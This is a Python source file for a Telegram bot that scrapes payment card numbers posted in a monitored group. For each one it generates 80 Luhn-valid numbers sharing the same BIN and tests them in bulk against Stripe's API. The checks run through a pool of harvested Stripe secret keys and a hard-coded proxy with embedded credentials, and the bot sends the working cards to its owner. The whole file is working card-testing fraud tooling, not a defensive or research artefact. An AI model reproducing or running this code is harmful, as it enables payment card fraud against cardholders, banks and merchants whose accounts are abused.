#!/usr/bin/env python3
"""
High-Performance Telegram Card Monitor & Checker Bot
Monitors a group for card posts, generates variations, checks them, and reports to owner.
"""

import re
import asyncio
import logging
import os
from typing import List, Tuple, Optional, Dict, Set
from datetime import datetime
import random
import json
from collections import deque

from pyrogram import Client, filters
from pyrogram.types import Message
import aiohttp
from aiohttp import BasicAuth

# Load environment variables
try:
    from dotenv import load_dotenv
    load_dotenv('config.env')
except ImportError:
    pass

# ==================== CONFIGURATION ====================
MONITORED_GROUP_ID = int(os.getenv('MONITORED_GROUP_ID', '-1002587158726'))
OWNER_USER_ID = int(os.getenv('OWNER_USER_ID', '5211166230'))
CARDS_PER_BIN = int(os.getenv('CARDS_PER_BIN', '80'))
MAX_CONCURRENT_CHECKS = int(os.getenv('MAX_CONCURRENT_CHECKS', '20'))

# Telegram credentials
API_ID = os.getenv('API_ID', 'YOUR_API_ID')
API_HASH = os.getenv('API_HASH', 'YOUR_API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN')

# Regex to match card format: 16 digits | 1-2 digits | 2-4 digits | optional CVV
CARD_PATTERN = re.compile(r'(\d{16})\|(\d{1,2})\|(\d{2,4})(?:\|(\d{3,4}))?')

# ==================== LOGGING SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== GLOBAL STATE ====================
card_queue = deque()  # Queue for cards to process
processing_cards: Set[str] = set()  # Currently processing cards
stats = {
    'total_checked': 0,
    'total_succeeded': 0,
    'bins_processed': {},
    'started_at': datetime.now()
}

# ==================== LUHN ALGORITHM ====================
def luhn_checksum(card_number: str) -> int:
    """Calculate Luhn checksum for a card number."""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number: str) -> bool:
    """Check if a card number is valid according to Luhn algorithm."""
    return luhn_checksum(card_number) == 0

def calculate_luhn_digit(partial_card: str) -> str:
    """Calculate the check digit for a partial card number."""
    check_digit = luhn_checksum(partial_card + '0')
    return str((10 - check_digit) % 10)

def generate_cards_from_bin(bin_prefix: str, exp_month: str, exp_year: str, count: int = 80) -> List[str]:
    """
    Generate valid card numbers from a BIN (first 6-12 digits).
    Returns list of cards in format: NUMBER|MM|YY
    """
    generated_cards = []
    seen = set()
    
    # Extract BIN (we'll use first 12 digits as base)
    bin_len = len(bin_prefix)
    if bin_len < 6:
        return []
    
    # For 16-digit cards, we need to generate the remaining digits
    attempts = 0
    max_attempts = count * 10  # Prevent infinite loops
    
    while len(generated_cards) < count and attempts < max_attempts:
        attempts += 1
        
        # Generate random digits for positions after BIN up to 15th position
        if bin_len >= 15:
            # Already have 15 digits, just calculate check digit
            partial = bin_prefix[:15]
        else:
            # Generate random digits to fill up to 15 digits
            random_part = ''.join([str(random.randint(0, 9)) for _ in range(15 - bin_len)])
            partial = bin_prefix + random_part
        
        # Calculate the check digit (16th digit)
        check_digit = calculate_luhn_digit(partial)
        full_card = partial + check_digit
        
        # Verify it's valid and not duplicate
        if full_card not in seen and is_luhn_valid(full_card):
            seen.add(full_card)
            card_str = f"{full_card}|{exp_month}|{exp_year}"
            generated_cards.append(card_str)
    
    return generated_cards

# ==================== STRIPE CHECKER ====================
class StripeChecker:
    """Handles Stripe API card validation."""
    
    INVALID_KEY_ERRORS = {'api_key_expired', 'testmode_charges_only'}
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.keys = []  # Will be loaded from keys.json
        self.timeout = aiohttp.ClientTimeout(total=30)
        self.proxy_url = (
            "http://abc9340056_bbii-zone-star-region-US:22708872@"
            "na.d9948b8569c695d3.abcproxy.vip:4950"
        )
    
    @staticmethod
    def extract_decline_code_and_advice(body_text: str) -> Tuple[str, str]:
        """Extract decline and advice codes from a Stripe error payload."""
        try:
            body = json.loads(body_text)
        except Exception:
            return ("Unknown error", "No advice")
        
        err = body.get("error") if isinstance(body, dict) else None
        if isinstance(err, dict):
            decline_code = (
                err.get("decline_code")
                or err.get("code")
                or err.get("error")
                or err.get("message")
                or "Unknown error"
            )
            advise_code = (
                err.get("failure_code")
                or err.get("advice")
                or err.get("message")
                or "No advice"
            )
        else:
            decline_code = "Unknown error"
            advise_code = "No advice"
        
        return (decline_code, advise_code)
    
    def _remove_key_pair(self, secret_key: str) -> None:
        """Remove a key pair from the loaded keys when it is invalid."""
        if not secret_key:
            return
        before = len(self.keys)
        self.keys = [
            pair for pair in self.keys
            if (pair.get('sk') or pair.get('secret_key')) != secret_key
        ]
        if before != len(self.keys):
            logger.warning(f"Removed invalid Stripe key: {secret_key[:10]}***")
    
    @staticmethod
    def format_failure_message(decline: str, advise: Optional[str]) -> str:
        if advise and advise != "No advice":
            return f"{decline} | {advise}"
        return decline
    
    async def ensure_session(self):
        """Ensure aiohttp session is initialized."""
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(timeout=self.timeout)
        return self.session
    
    async def close(self):
        """Close the aiohttp session."""
        if self.session and not self.session.closed:
            await self.session.close()
    
    def load_keys(self):
        """Load Stripe keys from keys.json or return test keys."""
        self.keys = []
        try:
            if os.path.exists('keys.json'):
                with open('keys.json', 'r') as f:
                    data = json.load(f)
                    # Extract all keys from all groups
                    for group_keys in data.values():
                        if isinstance(group_keys, list):
                            self.keys.extend(group_keys)
        except Exception as e:
            logger.error(f"Failed to load keys: {e}")
        
        if not self.keys:
            logger.warning("No Stripe keys loaded. Card checking will fail.")
    
    def get_random_key_pair(self) -> Optional[Dict[str, str]]:
        """Get a random Stripe key pair."""
        if not self.keys:
            return None
        return random.choice(self.keys)
    
    async def create_source(self, pk: str, card_data: str) -> Dict:
        """Create a Stripe source with the given card."""
        parts = card_data.split('|')
        if len(parts) < 3:
            return {'error': 'Invalid card format'}
        
        number, exp_month, exp_year = parts[:3]
        
        url = "https://api.stripe.com/v1/sources"
        payload = {
            "type": "card",
            "card[number]": number,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "key": pk,
            "payment_user_agent": "stripe.js/v3",
        }
        
        session = await self.ensure_session()
        try:
            async with session.post(url, data=payload, proxy=self.proxy_url) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    text = await resp.text()
                    decline, advise = self.extract_decline_code_and_advice(text)
                    retry_key = decline in self.INVALID_KEY_ERRORS or resp.status == 401
                    return {
                        'error': decline if decline != "Unknown error" else f'HTTP {resp.status}',
                        'advise': advise,
                        'details': text,
                        'retry_key': retry_key
                    }
        except Exception as e:
            return {'error': str(e)}
    
    async def create_customer(self, sk: str, source_id: str) -> Dict:
        """Create a Stripe customer with the source."""
        url = "https://api.stripe.com/v1/customers"
        payload = {"source": source_id}
        
        session = await self.ensure_session()
        try:
            async with session.post(url, data=payload, auth=BasicAuth(sk, ""), proxy=self.proxy_url) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    text = await resp.text()
                    decline, advise = self.extract_decline_code_and_advice(text)
                    retry_key = decline in self.INVALID_KEY_ERRORS or resp.status in (401, 403)
                    return {
                        'error': decline if decline != "Unknown error" else f'HTTP {resp.status}',
                        'advise': advise,
                        'details': text,
                        'retry_key': retry_key
                    }
        except Exception as e:
            return {'error': str(e)}

    async def create_and_confirm_setup_intent(self, sk: str, customer_id: str, source_id: str) -> Dict:
        """Create and confirm a SetupIntent using the provided customer and source."""
        session = await self.ensure_session()
        
        create_url = "https://api.stripe.com/v1/setup_intents"
        create_payload = {
            "customer": customer_id,
            "payment_method_types[]": "card"
        }
        
        try:
            async with session.post(create_url, data=create_payload, auth=BasicAuth(sk, ""), proxy=self.proxy_url) as create_resp:
                create_text = await create_resp.text()
                if create_resp.status != 200:
                    decline, advise = self.extract_decline_code_and_advice(create_text)
                    retry_key = decline in self.INVALID_KEY_ERRORS or create_resp.status in (401, 403)
                    return {
                        'error': decline if decline != "Unknown error" else f'HTTP {create_resp.status}',
                        'advise': advise,
                        'details': create_text,
                        'retry_key': retry_key
                    }
                setup_intent = await create_resp.json()
                setup_intent_id = setup_intent.get('id')
                if not setup_intent_id:
                    return {'error': 'No setup intent ID returned', 'details': create_text}
        except Exception as e:
            return {'error': str(e)}
        
        confirm_url = f"https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm"
        confirm_payload = {
            "payment_method": source_id
        }
        
        try:
            async with session.post(confirm_url, data=confirm_payload, auth=BasicAuth(sk, ""), proxy=self.proxy_url) as confirm_resp:
                if confirm_resp.status == 200:
                    return await confirm_resp.json()
                confirm_text = await confirm_resp.text()
                decline, advise = self.extract_decline_code_and_advice(confirm_text)
                retry_key = decline in self.INVALID_KEY_ERRORS or confirm_resp.status in (401, 403)
                return {
                    'error': decline if decline != "Unknown error" else f'HTTP {confirm_resp.status}',
                    'advise': advise,
                    'details': confirm_text,
                    'retry_key': retry_key
                }
        except Exception as e:
            return {'error': str(e)}
    
    async def check_card(self, card_data: str) -> Tuple[bool, str]:
        """
        Check if a card is valid using Stripe.
        Returns: (success: bool, message: str)
        """
        if not self.keys:
            return False, "No Stripe keys available"
        
        local_keys = list(self.keys)
        tried: Set[str] = set()
        
        while True:
            candidates = [
                pair for pair in local_keys
                if (pair.get('sk') or pair.get('secret_key')) not in tried
            ]
            if not candidates:
                if self.keys:
                    return False, "No valid Stripe keys remaining"
                return False, "No Stripe keys available"
            
            key_pair = random.choice(candidates)
            sk = key_pair.get('sk') or key_pair.get('secret_key')
            pk = key_pair.get('pk') or key_pair.get('publishable_key')
            
            if not sk or not pk:
                tried.add(sk or "")
                continue
            
            tried.add(sk)
            
            # Create source
            src_result = await self.create_source(pk, card_data)
            if not src_result or 'id' not in src_result:
                decline = src_result.get('error', 'Source creation failed') if isinstance(src_result, dict) else 'Source creation failed'
                advise = src_result.get('advise') if isinstance(src_result, dict) else None
                if isinstance(src_result, dict) and src_result.get('retry_key'):
                    self._remove_key_pair(sk)
                    local_keys = list(self.keys)
                    tried.discard(sk)
                    continue
                return False, self.format_failure_message(decline, advise)
            
            source_id = src_result['id']
            
            # Create customer
            cust_result = await self.create_customer(sk, source_id)
            if not cust_result or 'id' not in cust_result:
                decline = cust_result.get('error', 'Customer creation failed') if isinstance(cust_result, dict) else 'Customer creation failed'
                advise = cust_result.get('advise') if isinstance(cust_result, dict) else None
                if isinstance(cust_result, dict) and cust_result.get('retry_key'):
                    self._remove_key_pair(sk)
                    local_keys = list(self.keys)
                    tried.discard(sk)
                    continue
                return False, self.format_failure_message(decline, advise)
            
            customer_id = cust_result['id']
            
            # Create and confirm setup intent
            setup_intent_result = await self.create_and_confirm_setup_intent(sk, customer_id, source_id)
            if isinstance(setup_intent_result, dict) and setup_intent_result.get('status') == 'succeeded':
                return True, "Card authorized successfully"
            
            decline = setup_intent_result.get('error') if isinstance(setup_intent_result, dict) else 'Setup intent confirmation failed'
            advise = setup_intent_result.get('advise') if isinstance(setup_intent_result, dict) else None
            retry_key = isinstance(setup_intent_result, dict) and setup_intent_result.get('retry_key')
            
            if retry_key:
                self._remove_key_pair(sk)
                local_keys = list(self.keys)
                tried.discard(sk)
                continue
            
            if isinstance(setup_intent_result, dict) and setup_intent_result.get('status'):
                decline = setup_intent_result.get('status')
            
            return False, self.format_failure_message(decline or 'Setup intent confirmation failed', advise)

# ==================== BOT LOGIC ====================
stripe_checker = StripeChecker()

async def process_card_message(message: Message, app: Client):
    """Extract cards from a message and queue them for processing."""
    if not message.text:
        return
    
    # Find all cards in the message
    matches = CARD_PATTERN.findall(message.text)
    if not matches:
        return
    
    logger.info(f"Found {len(matches)} card(s) in message {message.id}")
    
    for match in matches:
        card_num, exp_month, exp_year, cvv = match
        
        # Extract BIN (first 12 digits for generation)
        bin_prefix = card_num[:12]
        
        # Create card info
        card_info = {
            'original_card': f"{card_num}|{exp_month}|{exp_year}",
            'bin': bin_prefix,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'message_id': message.id,
            'message_link': message.link if hasattr(message, 'link') else None
        }
        
        # Add to queue
        card_queue.append(card_info)
        logger.info(f"Queued BIN {bin_prefix} from message {message.id}")

async def process_queue(app: Client):
    """Continuously process cards from the queue."""
    logger.info("Card processing queue started")
    
    while True:
        try:
            if not card_queue:
                await asyncio.sleep(1)
                continue
            
            # Get next card from queue
            card_info = card_queue.popleft()
            bin_prefix = card_info['bin']
            
            # Skip if already processing this BIN
            if bin_prefix in processing_cards:
                logger.info(f"BIN {bin_prefix} already processing, skipping")
                continue
            
            processing_cards.add(bin_prefix)
            logger.info(f"Processing BIN: {bin_prefix}")
            
            # Generate cards
            generated_cards = generate_cards_from_bin(
                bin_prefix,
                card_info['exp_month'],
                card_info['exp_year'],
                CARDS_PER_BIN
            )
            
            logger.info(f"Generated {len(generated_cards)} cards for BIN {bin_prefix}")
            
            if not generated_cards:
                processing_cards.remove(bin_prefix)
                continue
            
            # Check cards concurrently
            succeeded_cards = []
            failed_count = 0
            
            sem = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
            
            async def check_single_card(card: str):
                nonlocal failed_count
                async with sem:
                    try:
                        success, message = await stripe_checker.check_card(card)
                        if success:
                            return card, True, message
                        else:
                            failed_count += 1
                            return card, False, message
                    except Exception as e:
                        logger.error(f"Error checking card: {e}")
                        failed_count += 1
                        return card, False, str(e)
            
            # Check all cards
            tasks = [check_single_card(card) for card in generated_cards]
            results = await asyncio.gather(*tasks)
            
            # Collect successful cards
            for card, success, message in results:
                if success:
                    succeeded_cards.append(card)
            
            # Update stats
            stats['total_checked'] += len(generated_cards)
            stats['total_succeeded'] += len(succeeded_cards)
            
            if bin_prefix not in stats['bins_processed']:
                stats['bins_processed'][bin_prefix] = {
                    'checked': 0,
                    'succeeded': 0
                }
            
            stats['bins_processed'][bin_prefix]['checked'] += len(generated_cards)
            stats['bins_processed'][bin_prefix]['succeeded'] += len(succeeded_cards)
            
            # Send report to owner
            await send_report(
                app,
                card_info,
                generated_cards,
                succeeded_cards,
                failed_count
            )
            
            # Remove from processing
            processing_cards.remove(bin_prefix)
            
            logger.info(f"Completed processing BIN {bin_prefix}: {len(succeeded_cards)}/{len(generated_cards)} succeeded")
            
        except Exception as e:
            logger.error(f"Error in queue processing: {e}", exc_info=True)
            await asyncio.sleep(1)

async def send_report(app: Client, card_info: Dict, generated: List[str], succeeded: List[str], failed: int):
    """Send a beautiful report to the owner."""
    bin_prefix = card_info['bin']
    success_rate = (len(succeeded) / len(generated) * 100) if generated else 0
    
    # Create report message
    report = f"""
╔═══════════════════════════════╗
║    🎯 CARD CHECKER REPORT    ║
╚═══════════════════════════════╝

📊 **BIN Information**
├ BIN: `{bin_prefix}******`
├ Original Card: `{card_info['original_card'][:6]}******{card_info['original_card'][-7:]}`
└ Message ID: `{card_info['message_id']}`

📈 **Check Results**
├ Total Generated: `{len(generated)}`
├ ✅ Succeeded: `{len(succeeded)}`
├ ❌ Failed: `{failed}`
└ 📊 Success Rate: `{success_rate:.1f}%`

⏱ **Session Stats**
├ Total Checked: `{stats['total_checked']}`
├ Total Succeeded: `{stats['total_succeeded']}`
└ Overall Rate: `{(stats['total_succeeded']/stats['total_checked']*100) if stats['total_checked'] else 0:.1f}%`
"""

    if succeeded:
        report += f"\n\n✅ **SUCCESSFUL CARDS** ({len(succeeded)}):\n"
        report += "```\n"
        # Show first 10 successful cards
        for card in succeeded[:10]:
            # Mask card number for display
            parts = card.split('|')
            masked = f"{parts[0][:6]}******{parts[0][-4:]}"
            report += f"{masked}|{parts[1]}|{parts[2]}\n"
        
        if len(succeeded) > 10:
            report += f"... and {len(succeeded) - 10} more\n"
        report += "```"
    
    # Add timestamp
    report += f"\n\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    try:
        await app.send_message(OWNER_USER_ID, report)
        logger.info(f"Report sent to owner for BIN {bin_prefix}")
    except Exception as e:
        logger.error(f"Failed to send report: {e}")

# ==================== BOT INITIALIZATION ====================
async def main():
    """Main bot entry point."""
    
    # Validate configuration
    if API_ID == 'YOUR_API_ID' or API_HASH == 'YOUR_API_HASH' or BOT_TOKEN == 'YOUR_BOT_TOKEN':
        logger.error("❌ Please configure your API credentials in config.env")
        logger.error("   Copy config.env.example to config.env and fill in your details")
        return
    
    # Initialize bot
    app = Client(
        "card_monitor_bot",
        api_id=API_ID,
        api_hash=API_HASH,
        bot_token=BOT_TOKEN
    )
    
    # Load Stripe keys
    stripe_checker.load_keys()
    
    @app.on_message(filters.chat(MONITORED_GROUP_ID))
    async def monitor_group(client: Client, message: Message):
        """Monitor the specified group for card messages."""
        await process_card_message(message, client)
    
    @app.on_message(filters.command("stats") & filters.user(OWNER_USER_ID))
    async def show_stats(client: Client, message: Message):
        """Show bot statistics."""
        uptime = datetime.now() - stats['started_at']
        
        stats_msg = f"""
📊 **Bot Statistics**

⏱ Uptime: `{uptime}`
📈 Total Checked: `{stats['total_checked']}`
✅ Total Succeeded: `{stats['total_succeeded']}`
📊 Success Rate: `{(stats['total_succeeded']/stats['total_checked']*100) if stats['total_checked'] else 0:.1f}%`

🔢 BINs Processed: `{len(stats['bins_processed'])}`
📋 Queue Size: `{len(card_queue)}`
⚙️ Processing: `{len(processing_cards)}`
"""
        await message.reply_text(stats_msg)
    
    # Start the bot
    async with app:
        logger.info("Bot started successfully!")
        logger.info(f"Monitoring group: {MONITORED_GROUP_ID}")
        logger.info(f"Reporting to user: {OWNER_USER_ID}")
        
        # Start queue processor
        asyncio.create_task(process_queue(app))
        
        # Keep the bot running
        await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
